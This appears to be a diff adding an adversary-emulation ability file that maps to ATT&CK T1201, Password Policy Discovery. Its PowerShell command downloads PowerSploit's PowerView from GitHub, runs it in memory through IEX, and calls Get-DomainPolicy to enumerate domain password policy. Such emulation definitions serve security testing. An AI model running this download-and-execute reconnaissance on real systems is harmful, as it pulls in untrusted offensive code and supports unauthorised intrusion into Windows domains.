@@ -1,0 +1,23 @@
+---
+- id: 214be4092770061080ef0781c26bab3e
+  name: Get-DomainPolicy with PowerView
+  description: 'Utilizing PowerView, run Get-DomainPolicy to return the default domain
+    policy or the domain controller policy for the current domain or a specified domain/domain
+    controller.
+
+    '
+  tactic: discovery
+  technique:
+    attack_id: T1201
+    name: Password Policy Discovery
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1''
+          -UseBasicParsing); Get-DomainPolicy -verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
